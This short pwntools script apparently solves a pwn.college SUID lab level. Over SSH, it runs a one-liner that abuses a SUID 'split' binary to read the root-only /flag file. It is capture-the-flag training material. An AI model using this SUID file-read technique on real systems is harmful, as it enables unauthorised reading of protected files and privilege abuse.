from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level16 to make /usr/bin/split SUID
s.process("/challenge/babysuid_level16")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/split /flag
# ? The split command splits a file into pieces,
# ? so we split the file into a temporary file
# ? and cat all the pieces together to get the flag
sh.sendline(b"TF=$(mktemp) split /flag $TF; cat $TF*")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
